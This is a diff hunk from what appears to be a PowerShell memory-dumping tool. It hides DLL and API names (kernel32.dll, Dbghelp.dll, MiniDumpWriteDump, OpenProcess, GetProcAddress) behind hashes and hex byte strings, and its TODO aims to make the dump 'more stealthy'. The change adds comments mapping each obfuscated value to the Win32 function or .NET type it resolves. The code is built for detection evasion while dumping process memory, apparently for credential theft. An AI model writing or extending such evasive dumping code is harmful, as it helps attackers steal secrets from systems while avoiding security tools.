@@ -4,20 +4,20 @@
     TODO: add encryption for the dump, so it can be saved on disk and also be more stealthy 
 #>
 $names_dict = @{
-    "sys_name" = "a674ffdf2929b4677f3c47386f6b76bb"
+    "sys_name" = "a674ffdf2929b4677f3c47386f6b76bb"    ## System.dll
     "libs" = @{
         "k32" = "6b,65,72,6e,65,6c,33,32,2e,64,6c,6c"
         "dbg" = "44,62,67,68,65,6c,70,2e,64,6c,6c"
     }
     "types" = @{
-        "unsafe" = "f95e15be377a2ad69115238ebdaaf2eb"
-        "native" = "9c1998077be57de794acb2cc817ea2c6"
-        "safe" = "868253cbd4ef1c53cc94a44fc703df9b"
+        "unsafe" = "f95e15be377a2ad69115238ebdaaf2eb"  ## Microsoft.Win32.UnsafeNativeMethods
+        "native" = "9c1998077be57de794acb2cc817ea2c6"  ## Microsoft.Win32.NativeMethods
+        "safe" = "868253cbd4ef1c53cc94a44fc703df9b"    ## Microsoft.Win32.SafeNativeMethods
     }
     "apis" = @{
-        "get_hand" = "7bc58a7febfd74a1356e1b559bd25ca2"
-        "get_addr" = "65538bfa1e4f3a0b7edde70bcc4cbe76"
-        "load" = "dedca8116e8b9f961ae535a1800d8222"
+        "get_hand" = "7bc58a7febfd74a1356e1b559bd25ca2"  ## GetModuleHandle
+        "get_addr" = "65538bfa1e4f3a0b7edde70bcc4cbe76"  ## GetProcAddress
+        "load" = "dedca8116e8b9f961ae535a1800d8222"      ## LoadLibrary
         "dump" = "4d,69,6e,69,44,75,6d,70,57,72,69,74,65,44,75,6d,70"
         "oproc" = "4f,70,65,6e,50,72,6f,63,65,73,73"
         "close" = "43,6c,6f,73,65,48,61,6e,64,6c,65"
